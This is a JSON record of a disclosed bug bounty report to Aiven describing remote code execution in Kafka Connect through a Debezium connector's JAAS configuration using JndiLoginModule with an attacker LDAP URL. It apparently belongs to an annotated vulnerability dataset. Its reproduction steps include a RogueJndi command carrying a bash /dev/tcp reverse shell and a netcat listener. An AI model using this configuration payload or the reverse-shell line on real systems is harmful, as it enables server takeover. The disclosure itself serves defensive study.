{
  "reported_to": "Aiven Ltd",
  "reported_by": "jarij ",
  "title": "Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration",
  "content": "\nSummary:\nWhen configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the database.history.producer.sasl.jaas.config connector property for the io.debezium.connector.mysql.MySqlConnector connector. This is likely true for other debezium connectors too. By setting the connector value to \"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://attacker_server\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";\", the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server.\nSteps To Reproduce:\n\u2588\u2588\u2588\u2588\u2588\u2588\nLogin into my VPS: ssh \u2588\u2588\u2588\u2588\u2588\u2588\u2588, password: \u2588\u2588\u2588\u2588\u2588\nExecute java -jar RogueJndi-1.1.jar --hostname \u2588\u2588\u2588 -c \"bash -c bash\\${IFS}-i\\${IFS}>&/dev/tcp/\u2588\u2588\u2588/4445<&1\"\nExecute nc -nlvp 4445 on another tab\nExecute python3 poc.py on another table. This poc script launches the exploit against my Aiven kafka connect instance.\nReverse shell connection should now be established\nThe gadget chain\nThe exploit uses System.setProperty gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala version 2.13.6. It may fail on other scala versions. Then the script executes the reverse shell setup command using the CommonsCollections7 payload.\nImpact\nAttacker can execute commands on the server and access other resources on the network.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 5000,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1667907000,
  "report_url": "https://hackerone.com/reports/1529790",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Login into the VPS and execute a rogue LDAP server using RogueJndi-1.1.jar"
    ],
    [
      2,
      "Set up a netcat listener to catch the reverse shell connection"
    ],
    [
      3,
      "Run the exploit script (poc.py) against the Aiven Kafka Connect instance"
    ],
    [
      4,
      "Establish a reverse shell connection to the attacker's server"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to execute remote code on a Kafka Connect server by exploiting a deserialization flaw in the JndiLoginModule configuration of a Debezium connector. The attacker can manipulate the SASL JAAS configuration to force the server to connect to a malicious LDAP server, leading to deserialization of attacker-controlled data and execution of arbitrary code.",
  "reason": "This vulnerability involves multiple complex components including LDAP protocol manipulation, Java deserialization gadget chains, and Scala library exploitation. The attacker must understand and chain these components correctly, including crafting a payload specific to the Scala version (2.13.6) and using non-obvious interactions between JNDI, LDAP, and Java deserialization.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}